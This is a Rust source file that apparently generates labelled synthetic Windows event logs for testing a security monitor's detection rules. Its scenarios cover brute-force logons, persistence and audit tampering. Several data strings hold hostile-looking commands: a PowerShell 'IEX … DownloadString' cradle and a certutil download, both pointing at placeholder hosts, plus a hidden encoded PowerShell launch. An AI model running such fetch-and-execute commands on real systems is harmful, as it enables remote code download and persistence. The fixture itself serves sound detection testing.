// SENTINEL DESK 1.0 — Deterministic fixture scenarios (labeled demo data)
//
// Ported 1:1 from the verified web prototype's `src/lib/engine/generator.ts`.
// Every record is tagged `synthetic = true` and carries a `sourceRef` for
// provenance. Used for:
//   * rule_test (MODULE 03 dry-run — available on every platform),
//   * the SyntheticCollector dev source (behind the `demo-fixtures` feature,
//     never bundled in release builds).
//
// NO real system is read here. External-looking IPs use RFC 5737 documentation
// ranges (203.0.113.0/24) and never reference real hosts.

#[cfg(feature = "demo-fixtures")]
use super::{CollectBatch, Collector, SourceReport, SourceStatus};
use super::RawWindowsEvent;
use rand::rngs::StdRng;
use rand::seq::SliceRandom;
use rand::Rng;
use rand::SeedableRng;
use serde_json::{json, Map};
use sha2::{Digest, Sha256};

pub const HOSTS: [&str; 3] = ["WS-FINANCE-04", "WS-ENGINEERING-11", "SRV-FILES-02"];
pub const USERS: [&str; 5] = ["j.morales", "a.chen", "svc_backup", "r.okafor", "m.petit"];
pub const ADMIN: &str = "adm.hartley";

/// Small deterministic RNG facade (mulberry32 replacement).
pub struct FixtureRng {
    inner: StdRng,
}

impl FixtureRng {
    pub fn new(seed: u64) -> Self {
        Self { inner: StdRng::seed_from_u64(seed) }
    }
    pub fn f64(&mut self) -> f64 {
        self.inner.gen::<f64>()
    }
    pub fn pick<'a, T>(&mut self, arr: &'a [T]) -> &'a T {
        arr.choose(&mut self.inner).unwrap_or(&arr[0])
    }
    /// RFC 5737 documentation-range IP — external-looking, never a real host.
    pub fn rand_ip(&mut self) -> String {
        format!("203.0.113.{}", 1 + (self.f64() * 250.0) as u64)
    }
    pub fn priv_ip(&mut self) -> String {
        format!("192.168.1.{}", 10 + (self.f64() * 200.0) as u64)
    }
    pub fn process_id(&mut self) -> u32 {
        1000 + (self.f64() * 60_000.0) as u32
    }
}

/// Stable pseudo-SID derived from a seed string (same scheme as the prototype).
fn sid(seed: &str) -> String {
    let mut h = Sha256::new();
    h.update(seed.as_bytes());
    let digest = h.finalize();
    let v = (u32::from_be_bytes([digest[0], digest[1], digest[2], digest[3]]) % 100_000) + 1000;
    format!("S-1-5-21-3623811015-3361044348-30300820-{v}")
}

/// Render a minimal Windows-style event XML so demo provenance looks like the
/// real EvtRender output the desktop build stores.
fn event_xml(e: &RawWindowsEvent) -> String {
    let mut data = String::new();
    for (k, v) in &e.raw_data {
        let val = match v {
            serde_json::Value::String(s) => xml_escape(s),
            other => xml_escape(&other.to_string()),
        };
        data.push_str(&format!("<Data Name=\"{k}\">{val}</Data>"));
    }
    format!(
        "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\
<System><Provider Name=\"{}\"/><EventID Qualifiers=\"\">{}</EventID>\
<Level>0</Level><Task>0</Task><Keywords>0x80000000000000</Keywords>\
<TimeCreated SystemTime=\"{}\"/><EventRecordID>{}</EventRecordID>\
<Computer>{}</Computer><Security/></System>\
<EventData>{data}</EventData></Event>",
        xml_escape(&e.provider),
        e.event_id,
        xml_escape(&e.time_created),
        xml_escape(&e.record_id),
        xml_escape(&e.computer),
    )
}

fn xml_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&apos;")
}

fn next_record_id(counter: &mut u64) -> String {
    *counter += 1;
    counter.to_string()
}

type RawVec = Vec<RawWindowsEvent>;

fn make(
    channel: &str,
    provider: &str,
    event_id: u32,
    level: &str,
    computer: &str,
    t: chrono::DateTime<chrono::Utc>,
    data: Map<String, serde_json::Value>,
    source_ref: &str,
    counter: &mut u64,
) -> RawWindowsEvent {
    let e = RawWindowsEvent {
        channel: channel.to_string(),
        provider: provider.to_string(),
        event_id,
        level: level.to_string(),
        computer: computer.to_string(),
        record_id: next_record_id(counter),
        time_created: t.to_rfc3339_opts(chrono::SecondsFormat::Millis, true),
        raw_data: data,
        raw_xml: String::new(),
        synthetic: true,
        source_ref: source_ref.to_string(),
    };
    let xml = event_xml(&e);
    RawWindowsEvent { raw_xml: xml, ..e }
}

fn s(v: &str) -> serde_json::Value {
    serde_json::Value::String(v.to_string())
}

// ─── Event templates (parity with generator.ts) ─────────────────────────────

#[allow(clippy::too_many_arguments)]
fn e4625(
    t: chrono::DateTime<chrono::Utc>,
    host: &str,
    user: Option<&str>,
    ip: Option<&str>,
    logon_type: Option<u32>,
    rnd: &mut FixtureRng,
    source_ref: &str,
    counter: &mut u64,
) -> RawWindowsEvent {
    let user = user.map(str::to_string).unwrap_or_else(|| rnd.pick(&USERS).to_string());
    let domain = host.split('-').next().unwrap_or("CORP");
    let mut data = Map::new();
    data.insert("SubjectUserName".into(), s(ADMIN));
    data.insert("SubjectDomainName".into(), s(domain));
    data.insert("TargetUserName".into(), s(&user));
    data.insert("TargetDomainName".into(), s(domain));
    data.insert("IpAddress".into(), s(&ip.map(str::to_string).unwrap_or_else(|| rnd.rand_ip())));
    data.insert("LogonType".into(), s(&logon_type.unwrap_or_else(|| *rnd.pick(&[10u32, 3, 2])).to_string()));
    data.insert("Status".into(), s("0xC000006A"));
    data.insert("SubStatus".into(), s("0xC000006A"));
    data.insert("FailureReason".into(), s("%%2313"));
    make("Security", "Microsoft-Windows-Security-Auditing", 4625, "Warning", host, t, data, source_ref, counter)
}

fn e4624(
    t: chrono::DateTime<chrono::Utc>,
    host: &str,
    user: Option<&str>,
    ip: Option<&str>,
    logon_type: u32,
    rnd: &mut FixtureRng,
    source_ref: &str,
    counter: &mut u64,
) -> RawWindowsEvent {
    let user = user.map(str::to_string).unwrap_or_else(|| rnd.pick(&USERS).to_string());
    let domain = host.split('-').next().unwrap_or("CORP");
    let mut data = Map::new();
    data.insert("SubjectUserName".into(), s("—"));
    data.insert("TargetUserName".into(), s(&user));
    data.insert("TargetDomainName".into(), s(domain));
    data.insert("IpAddress".into(), s(&ip.map(str::to_string).unwrap_or_else(|| rnd.priv_ip())));
    data.insert("LogonType".into(), s(&logon_type.to_string()));
    data.insert("ProcessName".into(), s("C:\\Windows\\System32\\svchost.exe"));
    data.insert("ElevatedToken".into(), s("%%1842"));
    make("Security", "Microsoft-Windows-Security-Auditing", 4624, "Information", host, t, data, source_ref, counter)
}

fn e4688(
    t: chrono::DateTime<chrono::Utc>,
    host: &str,
    user: Option<&str>,
    cmdline: &str,
    parent: &str,
    rnd: &mut FixtureRng,
    source_ref: &str,
    counter: &mut u64,
) -> RawWindowsEvent {
    let exe = cmdline.split(' ').next().unwrap_or("C:\\Windows\\System32\\svchost.exe");
    let mut data = Map::new();
    data.insert(
        "SubjectUserName".into(),
        s(&user.map(str::to_string).unwrap_or_else(|| rnd.pick(&USERS).to_string())),
    );
    data.insert("NewProcessId".into(), s(&rnd.process_id().to_string()));
    data.insert("NewProcessName".into(), s(exe));
    data.insert("CommandLine".into(), s(cmdline));
    data.insert("ParentProcessName".into(), s(parent));
    data.insert("TokenElevationType".into(), s("%%1936"));
    make("Security", "Microsoft-Windows-Security-Auditing", 4688, "Information", host, t, data, source_ref, counter)
}

fn e4698(
    t: chrono::DateTime<chrono::Utc>,
    host: &str,
    user: &str,
    task: &str,
    cmdline: &str,
    source_ref: &str,
    counter: &mut u64,
) -> RawWindowsEvent {
    let mut data = Map::new();
    data.insert("SubjectUserName".into(), s(user));
    data.insert("TaskName".into(), s(task));
    data.insert(
        "TaskContent".into(),
        s(&format!("<Task><Actions><Exec><Command>{cmdline}</Command></Exec></Actions></Task>")),
    );
    data.insert("ClientProcessId".into(), s("4127"));
    make("Security", "Microsoft-Windows-Security-Auditing", 4698, "Information", host, t, data, source_ref, counter)
}

fn e4719(t: chrono::DateTime<chrono::Utc>, host: &str, user: &str, source_ref: &str, counter: &mut u64) -> RawWindowsEvent {
    let mut data = Map::new();
    data.insert("SubjectUserName".into(), s(user));
    data.insert(
        "AuditPolicyChanges".into(),
        json!([
            "System Audit Policy - Category \"Logon/Logoff\" removed - Success",
            "System Audit Policy - Category \"Process Creation\" removed - Failure"
        ]),
    );
    data.insert("AuditPolicyApplied".into(), s("<AuditEvents/>"));
    make("Security", "Microsoft-Windows-Security-Auditing", 4719, "Information", host, t, data, source_ref, counter)
}

fn e1102(t: chrono::DateTime<chrono::Utc>, host: &str, user: &str, source_ref: &str, counter: &mut u64) -> RawWindowsEvent {
    let mut data = Map::new();
    data.insert("SubjectUserName".into(), s(user));
    let domain = host.split('-').next().unwrap_or("CORP");
    data.insert("SubjectDomainName".into(), s(domain));
    make("Security", "Microsoft-Windows-Security-Auditing", 1102, "Information", host, t, data, source_ref, counter)
}

fn e7045(
    t: chrono::DateTime<chrono::Utc>,
    host: &str,
    svc: &str,
    path: &str,
    source_ref: &str,
    counter: &mut u64,
) -> RawWindowsEvent {
    let mut data = Map::new();
    data.insert("ServiceName".into(), s(svc));
    data.insert("DisplayName".into(), s(svc));
    data.insert("ImagePath".into(), s(path));
    data.insert("ServiceType".into(), s("own process"));
    data.insert("StartType".into(), s("auto start"));
    data.insert("AccountName".into(), s("LocalSystem"));
    make("System", "Service Control Manager", 7045, "Information", host, t, data, source_ref, counter)
}

fn e4104(
    t: chrono::DateTime<chrono::Utc>,
    host: &str,
    user: &str,
    script: &str,
    source_ref: &str,
    counter: &mut u64,
) -> RawWindowsEvent {
    let mut data = Map::new();
    data.insert("ScriptBlockText".into(), s(script));
    data.insert("ScriptBlockId".into(), s(&format!("{{{}}}", uuid::Uuid::new_v4())));
    data.insert("Path".into(), s(""));
    data.insert("MessageNumber".into(), s("1"));
    data.insert("MessageTotal".into(), s("1"));
    data.insert("UserId".into(), s(&sid(user)));
    data.insert("SubjectUserName".into(), s(user));
    make(
        "PowerShell/Operational",
        "Microsoft-Windows-PowerShell",
        4104,
        "Information",
        host,
        t,
        data,
        source_ref,
        counter,
    )
}

fn e106(
    t: chrono::DateTime<chrono::Utc>,
    host: &str,
    user: &str,
    task: &str,
    source_ref: &str,
    counter: &mut u64,
) -> RawWindowsEvent {
    let mut data = Map::new();
    data.insert("TaskName".into(), s(task));
    data.insert("UserContext".into(), s(user));
    data.insert("Result".into(), s("0"));
    make(
        "TaskScheduler/Operational",
        "Microsoft-Windows-TaskScheduler",
        106,
        "Information",
        host,
        t,
        data,
        source_ref,
        counter,
    )
}

fn e_sys1(
    t: chrono::DateTime<chrono::Utc>,
    host: &str,
    user: Option<&str>,
    cmdline: &str,
    parent: &str,
    rnd: &mut FixtureRng,
    source_ref: &str,
    counter: &mut u64,
) -> RawWindowsEvent {
    let image = cmdline.split(' ').next().unwrap_or("C:\\Windows\\System32\\svchost.exe");
    let u = user.map(str::to_string).unwrap_or_else(|| rnd.pick(&USERS).to_string());
    let domain = host.split('-').next().unwrap_or("CORP");
    let mut hasher = Sha256::new();
    hasher.update(image.as_bytes());
    let hash = format!("SHA256={}", hex_upper(&hasher.finalize()));
    let mut data = Map::new();
    data.insert("Image".into(), s(image));
    data.insert("CommandLine".into(), s(cmdline));
    data.insert("User".into(), s(&format!("{domain}\\{u}")));
    data.insert("ParentImage".into(), s(parent));
    data.insert("ProcessGuid".into(), s(&format!("{{{}}}", uuid::Uuid::new_v4())));
    data.insert("ProcessId".into(), s(&rnd.process_id().to_string()));
    data.insert("Hashes".into(), s(&hash));
    make("Sysmon", "Microsoft-Windows-Sysmon", 1, "Information", host, t, data, source_ref, counter)
}

fn e_sys3(
    t: chrono::DateTime<chrono::Utc>,
    host: &str,
    user: Option<&str>,
    image: &str,
    cmdline: Option<&str>,
    ip: Option<&str>,
    rnd: &mut FixtureRng,
    source_ref: &str,
    counter: &mut u64,
) -> RawWindowsEvent {
    let u = user.map(str::to_string).unwrap_or_else(|| rnd.pick(&USERS).to_string());
    let domain = host.split('-').next().unwrap_or("CORP");
    let mut data = Map::new();
    data.insert("Image".into(), s(image));
    if let Some(c) = cmdline {
        data.insert("CommandLine".into(), s(c));
    }
    data.insert("User".into(), s(&format!("{domain}\\{u}")));
    data.insert("ProcessGuid".into(), s(&format!("{{{}}}", uuid::Uuid::new_v4())));
    data.insert("ProcessId".into(), s(&rnd.process_id().to_string()));
    data.insert("DestinationIp".into(), s(&ip.map(str::to_string).unwrap_or_else(|| rnd.rand_ip())));
    data.insert("DestinationPort".into(), s(&(*rnd.pick(&[443u32, 80, 8080])).to_string()));
    data.insert("Initiated".into(), s("true"));
    data.insert("SourceIp".into(), s(&rnd.priv_ip()));
    make("Sysmon", "Microsoft-Windows-Sysmon", 3, "Information", host, t, data, source_ref, counter)
}

fn e104(t: chrono::DateTime<chrono::Utc>, host: &str, source_ref: &str, counter: &mut u64) -> RawWindowsEvent {
    let mut data = Map::new();
    data.insert("Channel".into(), s("System"));
    make("System", "Microsoft-Windows-Eventlog", 104, "Information", host, t, data, source_ref, counter)
}

fn hex_upper(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02X}")).collect()
}

// ─── Scenarios (parity with generator.ts) ───────────────────────────────────

/// Build one scenario burst anchored at `t0` on `host`. Deterministic given
/// (scenario, t0, host, seed).
pub fn build_scenario(
    key: &str,
    t0: chrono::DateTime<chrono::Utc>,
    host: &str,
    seed: u64,
) -> RawVec {
    let mut rnd = FixtureRng::new(seed);
    let mut counter: u64 = 1300;
    let at = |secs: i64| t0 + chrono::Duration::seconds(secs);
    let mut ev: RawVec = Vec::new();

    match key {
        "brute_force" => {
            let src_ip = rnd.rand_ip();
            let tries = 6 + (rnd.f64() * 4.0) as usize;
            for i in 0..tries {
                ev.push(e4625(at(i as i64 * 25), host, None, Some(&src_ip), None, &mut rnd, &format!("fixtures/brute_force.json#{i}"), &mut counter));
            }
            ev.push(e4624(
                at((tries as i64 + 2) * 25),
                host,
                None,
                Some(&src_ip),
                10,
                &mut rnd,
                &format!("fixtures/brute_force.json#{tries}"),
                &mut counter,
            ));
        }
        "powershell_cradle" => {
            let u = rnd.pick(&USERS).to_string();
            let script = "IEX (New-Object Net.WebClient).DownloadString('http://cdn-updates.example/patch.ps1')";
            let cmd = "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA";
            ev.push(e4688(at(0), host, Some(&u), cmd, "C:\\Windows\\System32\\cmd.exe", &mut rnd, "fixtures/ps_cradle.json#proc", &mut counter));
            ev.push(e4104(at(15), host, &u, script, "fixtures/ps_cradle.json#sb", &mut counter));
            ev.push(e_sys3(
                at(22),
                host,
                Some(&u),
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                Some(cmd),
                Some(&rnd.rand_ip()),
                &mut rnd,
                "fixtures/ps_cradle.json#net",
                &mut counter,
            ));
        }
        "task_persistence" => {
            let u = rnd.pick(&USERS).to_string();
            let task = "\\Update\\HealthCheck";
            let cmd = "C:\\Users\\Public\\Scripts\\health.exe -k 8f3a";
            ev.push(e4104(at(0), host, &u, &format!("New-ScheduledTask -TaskName 'HealthCheck' -Execute '{cmd}'"), "fixtures/task_persist.json#sb", &mut counter));
            ev.push(e4698(at(40), host, &u, task, cmd, "fixtures/task_persist.json#4698", &mut counter));
            ev.push(e106(at(41), host, &u, task, "fixtures/task_persist.json#106", &mut counter));
        }
        "service_install_userpath" => {
            let path = "C:\\Users\\Public\\Updates\\SysHealthSvc.exe -L";
            ev.push(e7045(at(0), host, "SysHealthSvc", path, "fixtures/svc_install.json#7045", &mut counter));
            ev.push(e_sys1(at(30), host, Some(ADMIN), path, "C:\\Windows\\System32\\services.exe", &mut rnd, "fixtures/svc_install.json#proc", &mut counter));
        }
        "audit_tamper" => {
            ev.push(e4719(at(0), host, ADMIN, "fixtures/audit_tamper.json#4719", &mut counter));
            ev.push(e1102(at(60), host, ADMIN, "fixtures/audit_tamper.json#1102", &mut counter));
            ev.push(e104(at(75), host, "fixtures/audit_tamper.json#104", &mut counter));
        }
        "lolbin_network" => {
            let u = rnd.pick(&USERS).to_string();
            let cmd = "C:\\Windows\\System32\\certutil.exe -urlcache -f http://files-mirror.example/p/updates.cab C:\\Users\\Public\\updates.cab";
            ev.push(e_sys1(at(0), host, Some(&u), cmd, "C:\\Windows\\System32\\cmd.exe", &mut rnd, "fixtures/lolbin.json#proc", &mut counter));
            ev.push(e_sys3(
                at(12),
                host,
                Some(&u),
                "C:\\Windows\\System32\\certutil.exe",
                Some(cmd),
                Some(&rnd.rand_ip()),
                &mut rnd,
                "fixtures/lolbin.json#net",
                &mut counter,
            ));
        }
        "persistence_chain" => {
            let enc = "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA";
            let task_cmd = "C:\\Users\\Public\\Scripts\\svcmon.exe /sync";
            let svc_path = "C:\\Users\\Public\\Scripts\\svcmon.exe -service";
            ev.push(e4688(at(0), host, Some(ADMIN), enc, "C:\\Windows\\System32\\cmd.exe", &mut rnd, "fixtures/chain.json#proc", &mut counter));
            ev.push(e4104(at(8), host, ADMIN, "IEX (New-Object Net.WebClient).DownloadString('http://cdn-updates.example/stage2.ps1')", "fixtures/chain.json#sb", &mut counter));
            ev.push(e4698(at(120), host, ADMIN, "\\Platform\\SvcMon", task_cmd, "fixtures/chain.json#4698", &mut counter));
            ev.push(e106(at(121), host, ADMIN, "\\Platform\\SvcMon", "fixtures/chain.json#106", &mut counter));
            ev.push(e7045(at(200), host, "SvcMonSvc", svc_path, "fixtures/chain.json#7045", &mut counter));
            ev.push(e_sys3(
                at(260),
                host,
                Some(ADMIN),
                "C:\\Users\\Public\\Scripts\\svcmon.exe",
                None,
                Some(&rnd.rand_ip()),
                &mut rnd,
                "fixtures/chain.json#net",
                &mut counter,
            ));
        }
        // "benign_noise" and any unknown key → routine benign activity
        _ => {
            let u = rnd.pick(&USERS).to_string();
            ev.push(e4624(at(0), host, Some(&u), None, 2, &mut rnd, "fixtures/benign.json#logon", &mut counter));
            let cmdline = match (rnd.f64() * 3.0) as usize {
                0 => "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                1 => "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
                _ => "C:\\Windows\\System32\\mspaint.exe",
            };
            ev.push(e4688(at(20), host, Some(&u), cmdline, "C:\\Windows\\explorer.exe", &mut rnd, "fixtures/benign.json#proc", &mut counter));
        }
    }

    ev.sort_by(|a, b| a.time_created.cmp(&b.time_created));
    ev
}

pub const SCENARIO_KEYS: [&str; 8] = [
    "benign_noise",
    "brute_force",
    "powershell_cradle",
    "task_persistence",
    "service_install_userpath",
    "audit_tamper",
    "lolbin_network",
    "persistence_chain",
];

pub fn is_valid_scenario(key: &str) -> bool {
    SCENARIO_KEYS.contains(&key)
}

/// Build the deterministic fixture used by `rule_test` (one batch, one host,
/// fixed seed) — parity with the prototype's `testRule` (batches: 2, seed: 42)
/// but single-batch so per-host threshold grouping is deterministic.
pub fn rule_test_fixture(scenario_key: &str) -> Result<RawVec, String> {
    if !is_valid_scenario(scenario_key) {
        return Err(format!("unknown fixture scenario '{scenario_key}'"));
    }
    let host = HOSTS[0];
    let t0 = chrono::Utc::now() - chrono::Duration::seconds(90);
    Ok(build_scenario(scenario_key, t0, host, 42))
}

// ─── SyntheticCollector (feature "demo-fixtures", dev only) ─────────────────

/// Clearly-labeled DEMO telemetry source. Emits deterministic scenario bursts.
/// NEVER enabled in release bundles; the desktop product uses the real
/// read-only Windows Event Log collector.
#[cfg(feature = "demo-fixtures")]
pub struct SyntheticCollector {
    rng: FixtureRng,
}

#[cfg(feature = "demo-fixtures")]
impl Default for SyntheticCollector {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(feature = "demo-fixtures")]
impl SyntheticCollector {
    pub fn new() -> Self {
        let seed = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_millis() as u64)
            .unwrap_or(42);
        Self { rng: FixtureRng::new(seed) }
    }
}

#[cfg(feature = "demo-fixtures")]
impl Collector for SyntheticCollector {
    fn name(&self) -> &'static str {
        "synthetic-demo"
    }

    fn collect(&mut self, batch_max: usize) -> Result<CollectBatch, String> {
        let mut batch = CollectBatch::default();
        // Weighted scenario pick (parity with the prototype's weights).
        let weights: [(&str, u32); 8] = [
            ("benign_noise", 26),
            ("brute_force", 14),
            ("powershell_cradle", 14),
            ("task_persistence", 12),
            ("service_install_userpath", 10),
            ("audit_tamper", 8),
            ("lolbin_network", 8),
            ("persistence_chain", 8),
        ];
        let total: u32 = weights.iter().map(|w| w.1).sum();
        let mut events: RawVec = Vec::new();
        let host = self.rng.pick(&HOSTS).to_string();
        let mut roll = self.rng.f64() * f64::from(total);
        let mut scenario_key = "benign_noise".to_string();
        for (k, w) in weights {
            roll -= f64::from(w);
            if roll <= 0.0 {
                scenario_key = k.to_string();
                break;
            }
        }
        let t0 = chrono::Utc::now() - chrono::Duration::seconds((self.rng.f64() * 240.0) as i64);
        events.extend(build_scenario(&scenario_key, t0, &host, (self.rng.f64() * 1.0e9) as u64));
        if batch_max > 0 && events.len() > batch_max {
            events.truncate(batch_max);
        }
        let _count = events.len();
        for c in super::CHANNELS {
            batch.source_reports.push(SourceReport {
                channel: c.logical.to_string(),
                windows_path: c.windows_path.map(str::to_string),
                status: SourceStatus::Demo,
                note: Some("Labeled synthetic demo source — no real Windows telemetry is read.".into()),
                collected: 0,
            });
        }
        batch.events = events;
        Ok(batch)
    }
}
